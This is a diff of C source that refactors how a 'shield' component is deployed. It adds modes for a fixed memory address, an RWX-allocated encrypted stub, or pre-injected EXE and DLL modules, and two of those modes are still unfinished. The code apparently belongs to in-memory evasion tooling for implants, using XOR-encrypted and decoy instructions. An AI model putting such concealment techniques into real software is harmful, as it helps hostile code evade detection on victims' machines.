@@ -13,6 +13,11 @@
 #include "shield.h"
 #include "debug.h"
 
+#define SHIELD_TARGET_MEM_ADDRESS 1
+#define SHIELD_TARGET_SHILED_STUB 2
+#define SHIELD_TARGET_EXE_MODULE  3
+#define SHIELD_TARGET_DLL_MODULE  4
+
 #define METHOD_SLEEP 1
 #define METHOD_STOP  2
 
@@ -226,8 +231,25 @@ static errno initShieldEnvironment(Shield* shield, Context* context)
     XORBuffer(decoyInst, decoySize, key, SHIELD_KEY_SIZE);
 
     // deploy shield
-    if (context->ShieldModuleHash == 0)
+    int target;
+    if (context->ShieldAddress != 0) 
     {
+        target = SHIELD_TARGET_MEM_ADDRESS;
+    } else if (context->ShieldModuleHash == 0) {
+        target = SHIELD_TARGET_SHILED_STUB;
+    } else if (context->ShieldModuleHash == SHIELD_MAIN_MODULE) {
+        target = SHIELD_TARGET_EXE_MODULE;
+    } else {
+        target = SHIELD_TARGET_DLL_MODULE;
+    }
+    switch (target)
+    {
+    case SHIELD_TARGET_MEM_ADDRESS:
+        shield->status.EntryPoint  = (void*)(context->ShieldAddress);
+        shield->status.BaseAddress = 0;
+        shield->status.Source      = SHIELD_SRC_EXTERNAL;
+        break;
+    case SHIELD_TARGET_SHILED_STUB:
         // allocate RWX memory page for shield
         SIZE_T size = shieldSize + (2 + RandUintN(0, 8)) * 1024;
         DWORD  type = MEM_COMMIT|MEM_RESERVE;
@@ -247,21 +269,26 @@ static errno initShieldEnvironment(Shield* shield, Context* context)
         {
             XORBuffer(shieldInst, shieldSize, key, SHIELD_KEY_SIZE);
         } else {
-            EraseBuffer((void*)stub, SHIELD_STUB_SIZE); // TODO shift buffer ?
+            EraseBuffer((void*)stub, SHIELD_STUB_SIZE);
         }
         // set status
         shield->status.EntryPoint  = entryPoint;
         shield->status.BaseAddress = addr;
-        shield->status.IsAllocated = true;
-    } else {
+        shield->status.Source      = SHIELD_SRC_SHIELD_STUB;
+        break;
+    case SHIELD_TARGET_EXE_MODULE:
         // TODO find the target module and calculate
         // the pre-injected shield entry point
 
 
         // set status
-        shield->status.EntryPoint    = NULL;
-        shield->status.BaseAddress   = NULL;
-        shield->status.IsPreInjected = true;
+        shield->status.EntryPoint  = NULL;
+        shield->status.BaseAddress = NULL;
+        shield->status.Source      = SHIELD_SRC_PRE_INJECTED;
+        break;
+    case SHIELD_TARGET_DLL_MODULE:
+
+        break;
     }
 
     // prepare shelter for save instance
